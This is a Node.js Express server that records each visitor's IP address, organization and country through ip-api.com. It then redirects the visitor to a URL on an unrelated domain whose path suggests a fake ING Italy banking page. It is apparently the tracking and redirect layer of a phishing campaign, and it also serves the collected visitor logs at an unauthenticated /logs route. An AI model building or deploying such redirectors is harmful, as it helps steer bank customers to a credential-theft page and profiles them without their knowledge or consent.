import express from "express";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Redirect target
const TARGET_URL = "https://smartvisitorpsmza.info/it/ing-it/web/add.php";
// Log file (Render's filesystem is ephemeral across deploys; logs persist per instance until restart)
const LOG_PATH = path.join(__dirname, "visitors.log");

// Trust Render/Proxy to get real IP from X-Forwarded-For
app.set("trust proxy", true);

// Small helper to format date as [YYYY-MM-DD HH:mm:ss] in Asia/Makassar (UTC+8)
function formatTimestamp(date = new Date()) {
  const fmt = new Intl.DateTimeFormat("en-GB", {
    timeZone: "Asia/Makassar",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });
  const parts = Object.fromEntries(fmt.formatToParts(date).map(p => [p.type, p.value]));
  // en-GB gives DD/MM/YYYY; convert to YYYY-MM-DD
  const [dd, mm, yyyy] = [parts.day, parts.month, parts.year];
  const time = `${parts.hour}:${parts.minute}:${parts.second}`;
  return `[${yyyy}-${mm}-${dd} ${time}]`;
}

// Basic IP extraction
function getClientIp(req) {
  // X-Forwarded-For may contain multiple IPs: client, proxies...
  const xff = (req.headers["x-forwarded-for"] || "").split(",").map(s => s.trim()).filter(Boolean);
  if (xff.length) return xff[0];
  // Fallbacks
  return req.ip || req.connection?.remoteAddress || req.socket?.remoteAddress || "0.0.0.0";
}

// Free IP info (organization + country) using ip-api.com
async function lookupIp(ip) {
  try {
    // ip-api supports HTTP for free tier
    const res = await fetch(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,org,query`);
    const json = await res.json();
    if (json.status === "success") {
      return {
        ip: json.query || ip,
        org: json.org || "Unknown",
        country: json.country || "Unknown"
      };
    }
  } catch (e) {
    // ignore
  }
  return { ip, org: "Unknown", country: "Unknown" };
}

// Root: log and redirect
app.get("/", async (req, res) => {
  const ip = getClientIp(req);
  const info = await lookupIp(ip);

  const line = `${formatTimestamp()} IP: ${info.ip} | Organization: ${info.org} | Country: ${info.country}\n`;

  // Append to file AND to console (Render dashboard keeps stdout logs)
  try {
    fs.appendFileSync(LOG_PATH, line, "utf8");
  } catch (e) {
    // If file write fails for any reason, still log to console
  }
  console.log(line.trim());

  // 302 redirect
  res.redirect(302, TARGET_URL);
});

// Optional: serve last 200 log lines (read-only)
app.get("/logs", (req, res) => {
  try {
    if (!fs.existsSync(LOG_PATH)) return res.type("text/plain").send("No logs yet.");
    const data = fs.readFileSync(LOG_PATH, "utf8").split("\n");
    const last = data.slice(-200).join("\n");
    res.type("text/plain").send(last);
  } catch (e) {
    res.status(500).type("text/plain").send("Error reading logs.");
  }
});

// Health check
app.get("/health", (req, res) => {
  res.type("text/plain").send("OK");
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`Listening on port ${PORT}`);
});
